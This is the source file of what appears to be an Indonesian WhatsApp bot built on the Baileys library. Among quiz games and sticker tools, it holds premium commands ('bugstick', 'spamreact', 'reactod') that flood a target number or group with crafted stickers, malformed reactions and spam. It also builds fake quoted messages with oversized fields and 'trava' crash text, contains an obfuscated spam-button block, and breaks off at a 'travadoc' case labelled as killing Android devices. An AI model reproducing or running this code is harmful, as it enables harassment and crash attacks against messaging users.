require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const { hentai } = require('./lib/scraper2.js')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')

// CHARACTER TEXT //
doctext = fs.readFileSync('./src/doctext.txt')
catalog1 = fs.readFileSync('./src/catalog1.txt')
catalog2 = fs.readFileSync('./src/catalog2.txt')
emojitrava = fs.readFileSync('./src/emojitrava.txt')
iostext = fs.readFileSync('./src/iostext.txt')
jids = fs.readFileSync('./src/jids.txt')
card = fs.readFileSync('./src/card.txt')
vbutton = fs.readFileSync('./src/buttons.txt')




// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []

module.exports = hisoka = async (hisoka, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await hisoka.decodeJid(hisoka.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = [botNumber, ...global.premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const isMedia = /image|video|sticker|audio/.test(mime)
	
        // Group
        const groupMetadata = m.isGroup ? await hisoka.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
	
	
	
	try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)

            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
            }
    
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false,
            }
		
	    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
		if (!('templateImage' in setting)) setting.templateImage = true
		if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false	
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: false,
		templateImage: true,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
	    }
	    
        } catch (err) {
            console.error(err)
        }
        
        
const fvideo = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, ...(m.chat ? 
{ remoteJid: "37122219115-14033332013@g.us" } : {}) 
},
message: { 
"videoMessage": { 
"title": ``,
"h": ``,
'seconds': '9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999', 
'caption': `${emojitrava}`,
'jpegThumbnail': fs.readFileSync('./src/menu.jpg')
}
}
}
const floc = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, ...(m.chat ? 
{ remoteJid: "37122219115-14033332013@g.us" } : {}) 
},
message: { 
liveLocationMessage: {
caption: `${emojitrava}`,
jpegThumbnail: fs.readFileSync('./src/menu.jpg')
}
}
}

const fgif = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, ...(m.chat ? 
{ remoteJid: "37122219115-14033332013@g.us" } : {}) 
},
message: { 
 "videoMessage": { 
 "title":``,
 "h": ``,
 'seconds': "9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999", 
 'gifPlayback': 'true', 
 'caption': `${emojitrava}`,
 'jpegThumbnail': fs.readFileSync('./src/menu.jpg')
}
}
} 
const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `37122219115-14033332013@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${emojitrava}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;hxhddh,;;;\nFN:dhhdhdh,\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Click to chat\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    
	    
        // Public & Self
        if (!hisoka.public) {
            if (!m.key.fromMe) return
        }

        // Push Message To Console && Auto Read
        if (m.message) {
            hisoka.sendReadReceipt(m.chat, m.sender, [m.key.id])
            console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }
	
	// reset limit every 12 hours
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
        
	// auto set bio
	if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await hisoka.setStatus(`${hisoka.user.name} | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}
        
      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }

        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: hisoka.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, hisoka.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        hisoka.ev.emit('messages.upsert', msg)
        }
	    
	if (('family100'+m.chat in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            hisoka.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
        }

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebakgambar[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebakkata[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
        
        //TicTacToe
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    m.reply({
	    '-3': 'Game telah berakhir',
	    '-2': 'Invalid',
	    '-1': 'Posisi Invalid',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await hisoka.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await hisoka.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
	    hisoka.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    hisoka.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) hisoka.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) hisoka.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) hisoka.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    hisoka.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih2) hisoka.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) hisoka.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    hisoka.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
        }

        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]   
            m.reply(`.`)
            m.reply(`.`)
            m.reply(`.`)
            user.afkTime = -1
            user.afkReason = ''
        }

        switch(command) {
// BUTTONS URL //
case '@kkeksbzhaijshxbdb': {
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
const templateMessage = {
  text: `Kecelakaan Tak Terduga`,footer: `? ? ? ? ? ? ? ? ? ? ?`,
  templateButtons: [
  {
  index: 1, 
  urlButton: {
  displayText: 'Carosatzx', 
  url: `https://wa.me/37122219115`
  }
  },
{
  index: 1, 
  urlButton: {
  displayText: 'Bango', 
  url: `https://wa.me/6289508496581`
  }
  },
  ],
  }
  hisoka.sendMessage(m.chat, templateMessage)
}
break

case 'hah': {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','6289514100332','771192XPifQJ','6289514100332','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','reply\x20Menger','https://chat.whatsapp.com/GkZVA2qAXhKKJ6phCAVli8','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await hisoka[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZENU\x20AIZAK\x20BOYS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZENU\x20AIZAK\x20BOYS','id':_0x47bf3a(0x153)}}]}));
}
break

case 'bugstick': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Nomor|Jumlah`)
numbers = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
hisoka.sendMessage(`${numbers}@s.whatsapp.net`, {sticker: fs.readFileSync('./src/stick.webp')},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}})
}
m.reply(`Sukses kirim ke nomor ${numbers}`)
}
break

case 'bugstickgc': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Jumlah`)
for (let i = 0; i < args[0]; i++) {
hisoka.sendMessage(m.chat, {sticker: fs.readFileSync('./src/stick.webp')},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}})
}
}
break

 // 💫 STICKERS //
case 'sgif': case 'sticker': case 's': {
if (!isPremium) return m.reply(global.mess.premium)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await hisoka.sendImageAsSticker(m.chat, media, m, { packname: global.emojistick, author: global.nameowner })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maximum 10 seconds!')
let media = await quoted.download()
let encmedia = await hisoka.sendVideoAsSticker(m.chat, media, m, { packname: global.emojistick, author: global.nameowner })
await fs.unlinkSync(encmedia)
} else {
m.reply(`Send Image/Video With Caption ${prefix + command}\nVideo Duration 1-9 Seconds`)
}
}
break

// 💫 BUG REACTIONS //
/*case 'bugreact':
if (!isPremium) return m.reply(global.mess.premium)
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
break*/

case 'haiicoy': {
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"noteMessage": {
"extendedTextMessage": {
"text": `hai`,
}
}}}), { userJid: m.chat, quoted: fgif })
hisoka.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
break

case 'reactod' : {
if (!isCreator) return m.reply(global.mess.owner)
if (args.length < 1) return m.reply('Jumlahnya?')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await hisoka.sendMessage(m.chat, {react: { text: `<>[+<÷》£/÷}÷[×,'lc),#(^%@&@('?¿`, key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
for (let i = 0; i < args[0]; i++) {
hisoka.sendMessage(m.chat, {text: "Pfft"}, {quoted: a})
}
}
break

case 'spamreact' : {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Nomor|Jumlah`)
numbers = q.split('|')[0]
jumlah = q.split('|')[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await hisoka.sendMessage(`${numbers}@s.whatsapp.net`, {react: { text: `<>[+<÷》£/÷}÷[×,'lc),#(^%@&@('?¿`, key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
for (let i = 0; i < jumlah; i++) {
hisoka.sendMessage(`${numbers}@s.whatsapp.net`, {text: "Pfft"}, {quoted: a})
}
m.reply(`Sukses kirim ke nomor ${numbers}`)
}
break

case 'spamreactgc' : {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Jumlah`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await hisoka.sendMessage(m.chat, {react: { text: `<>[+<÷》£/÷}÷[×,'lc),#(^%@&@('?¿`, key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
for (let i = 0; i < args[0]; i++) {
hisoka.sendMessage(m.chat, {text: "Pfft"}, {quoted: a})
}
}
break



// 💫 DOC BUNUH ANDROID //
case 'travadoc': {
if (!isPremium) return m.reply(global.mess.premium)
